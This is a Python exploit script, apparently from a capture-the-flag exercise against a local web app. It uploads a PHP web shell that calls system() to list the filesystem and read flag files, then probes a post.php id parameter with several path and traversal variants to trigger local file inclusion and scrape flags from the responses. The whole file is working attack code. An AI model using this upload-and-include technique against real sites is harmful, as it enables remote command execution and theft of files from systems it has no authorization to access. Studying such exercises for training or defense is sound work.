import requests
import re

base_url = "http://127.0.0.1:32891"

# First, upload a finder PHP file
finder_code = '<?php system("ls -la /; cat /flag* 2>/dev/null; find / -name flag.txt 2>/dev/null"); ?>'
files = {'articleFile': ('finder.php', finder_code)}
data = {'name': 'Test', 'email': 'test@test.com'}

print("[+] Uploading finder.php...")
resp = requests.post(f"{base_url}/posts/upload-article.php", files=files, data=data)
print(f"[+] POST {base_url}/posts/upload-article.php")
print(f"[+] Status: {resp.status_code} | Length: {len(resp.content)}B")
print(f"[+] Upload Response:\n{resp.text}\n")

# Test different inclusion methods
test_cases = [
    "finder.php",
    "uploads/finder.php",
    "posts/uploads/finder.php",
    "/posts/uploads/finder.php",
    "../uploads/finder.php",
]

print("[+] Testing LFI inclusion methods...\n")
for test_id in test_cases:
    resp = requests.get(f"{base_url}/post.php", params={'id': test_id})
    print(f"{'='*60}")
    print(f"[+] GET {base_url}/post.php?id={test_id}")
    print(f"[+] Status: {resp.status_code} | Length: {len(resp.content)}B")
    
    if "Post not found" in resp.text:
        print("[+] Result: Post not found")
    elif "Directory traversal" in resp.text or "traversal" in resp.text.lower():
        print("[+] Result: Blocked by traversal detection")
    else:
        print(f"[+] Result: Potential success!")
        
        # Look for flag patterns
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
        if flags:
            print(f"[!] FLAG FOUND: {flags}")
        
        # Print response (full output for analysis)
        print(f"[+] Full Response:\n{resp.text}")
    
    print()

print("[+] LFI testing complete")

